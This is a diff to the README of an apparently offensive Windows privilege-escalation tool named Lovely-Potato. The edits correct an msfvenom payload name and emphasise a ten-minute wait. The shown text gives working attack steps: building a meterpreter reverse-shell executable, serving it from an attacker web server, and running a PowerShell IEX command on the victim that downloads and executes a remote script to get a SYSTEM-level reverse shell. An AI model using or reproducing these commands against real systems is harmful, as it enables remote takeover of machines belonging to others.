@@ -14,7 +14,7 @@ $LocalPath = "[WritablePathOnVictimMachine]"
 ```
 Now create a meterpreter binary on the attacker machine or use any other executable reverse shell:
 ```
-root@attacker:~/Lovely-Potato# msfvenom -p windows/meterpreter/reverset_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f exe -o meterpreter.exe
+root@attacker:~/Lovely-Potato# msfvenom -p windows/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] -f exe -o meterpreter.exe
 ```
 Start a web server in this repo to serve your meterpreter.exe and other dependencies:
 ```
@@ -25,7 +25,7 @@ On a new terminal, launch metasploit console (or any listener which handles what
 root@attacker:~# msfdb run
 msf5 > # I'm going to omit setting up the multi handler as it is something you should already know
 ```
-Finally enter below command on victim's powershell console and wait **10 minutes** for reverse shell running as user NT AUTHORITY\SYSTEM!
+Finally enter below command on victim's powershell console and you **MUST WAIT 10 minutes** for reverse shell running as user NT AUTHORITY\SYSTEM!
 ```
 PS > IEX(New-Object Net.WebClient).DownloadString('http://[AttackerIP]/Invoke-LovelyPotato.ps1')
 ```
